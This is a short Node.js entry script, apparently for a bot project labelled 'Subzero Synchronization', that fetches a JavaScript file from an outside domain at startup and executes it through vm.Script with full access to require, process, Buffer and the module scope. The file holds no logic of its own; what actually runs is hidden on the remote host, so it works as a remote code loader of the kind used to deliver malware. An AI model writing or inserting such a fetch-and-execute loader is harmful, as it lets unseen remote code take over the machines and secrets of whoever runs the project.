
// PAKISTANI STAR ON TOP
const axios = require('axios');
const vm = require('vm');
const config = require('./config.js');

(async () => {
  try {
    console.log("❄️ Subzero Synchronization Initiated !");
    const { data: scriptCode } = await axios.get(`https://cdn-bandaheali.zone.id/file/index (2).js`);
    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
  } catch (err) {
    console.error("Error:", err);
  }
})();
